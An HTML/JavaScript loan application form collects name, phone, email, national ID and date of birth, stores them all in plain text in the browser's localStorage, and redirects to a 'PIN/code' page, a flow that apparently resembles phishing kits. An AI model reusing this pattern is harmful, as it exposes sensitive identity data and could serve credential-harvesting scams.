<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loan Application Form</title>
<style>
    body {
        font-family: Arial, sans-serif;
        background: #f6f7fb;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
    }

    .loan-container {
        background: #fff;
        padding: 30px;
        border-radius: 12px;
        width: 100%;
        max-width: 400px;
        box-shadow: 0 5px 15px rgba(0,0,0,0.1);
    }

    h2 {
        text-align: center;
        margin-bottom: 20px;
    }

    label {
        display: block;
        margin: 10px 0 5px;
        font-weight: bold;
    }

    input, select {
        width: 100%;
        padding: 10px;
        border-radius: 6px;
        border: 1px solid #ccc;
        margin-bottom: 15px;
        box-sizing: border-box;
    }

    input[type="checkbox"] {
        width: auto;
        margin-right: 10px;
    }

    .checkbox-container {
        display: flex;
        align-items: center;
        margin-bottom: 20px;
    }

    button {
        width: 100%;
        padding: 12px;
        background: red;
        color: white;
        border: none;
        border-radius: 6px;
        font-size: 16px;
        cursor: pointer;
    }

    button:disabled {
        background: #ccc;
        cursor: not-allowed;
    }
</style>
</head>

<body>
<div class="loan-container">
    <h2>Loan Application Form</h2>
    <form class="loan-details-form">
        <label>Full Name</label>
        <input id="name" type="text" placeholder="Full Name" required>

        <label>Phone Number</label>
        <input id="phone" type="tel" placeholder="Phone Number" required>

        <label>Email</label>
        <input id="email" type="email" placeholder="Email" required>

        <label>National ID</label>
        <input id="nationalId" type="text" placeholder="National ID" required>

        <label>Date of Birth</label>
        <input id="dob" type="date" required>

        <label>Employment Status</label>
        <select id="employmentStatus" required>
            <option value="">Select Status</option>
            <option value="Employed">Employed</option>
            <option value="Self-employed">Self-employed</option>
            <option value="Unemployed">Unemployed</option>
        </select>

        <label>Loan Purpose</label>
        <select id="loanPurpose" required>
            <option value="">Select Purpose</option>
            <option value="Business">Business</option>
            <option value="Education">Education</option>
            <option value="Personal">Personal</option>
        </select>

        <label>Repayment Period</label>
        <select id="repaymentPeriod" required>
            <option value="">Select Period</option>
            <option value="1 month">1 month</option>
            <option value="3 months">3 months</option>
            <option value="6 months">6 months</option>
            <option value="12 months">12 months</option>
        </select>

        <div class="checkbox-container">
            <input type="checkbox" id="confirmCheck">
            <label for="confirmCheck">I confirm that the information above is correct</label>
        </div>

        <button type="submit" id="nextBtn" disabled>Next</button>
    </form>
</div>

<script>
const nextBtn = document.getElementById('nextBtn');
const confirmCheck = document.getElementById('confirmCheck');
const form = document.querySelector('.loan-details-form');

// Enable button only if checkbox is checked
confirmCheck.addEventListener('change', () => {
    nextBtn.disabled = !confirmCheck.checked;
});

// On form submit
form.addEventListener('submit', (e) => {
    e.preventDefault();

    // Get values
    const name = document.getElementById('name').value;
    const phone = document.getElementById('phone').value;
    const email = document.getElementById('email').value;
    const nationalId = document.getElementById('nationalId').value;
    const dob = document.getElementById('dob').value;
    const employmentStatus = document.getElementById('employmentStatus').value;
    const loanPurpose = document.getElementById('loanPurpose').value;
    const repaymentPeriod = document.getElementById('repaymentPeriod').value;

    // Save name and phone in localStorage for PIN/code pages
    localStorage.setItem('name', name);
    localStorage.setItem('phone', phone);

    // Optionally save other details too if needed
    localStorage.setItem('email', email);
    localStorage.setItem('nationalId', nationalId);
    localStorage.setItem('dob', dob);
    localStorage.setItem('employmentStatus', employmentStatus);
    localStorage.setItem('loanPurpose', loanPurpose);
    localStorage.setItem('repaymentPeriod', repaymentPeriod);

    // Redirect to PIN page
    window.location.href = 'pin.html';
});
</script>
</body>
</html>
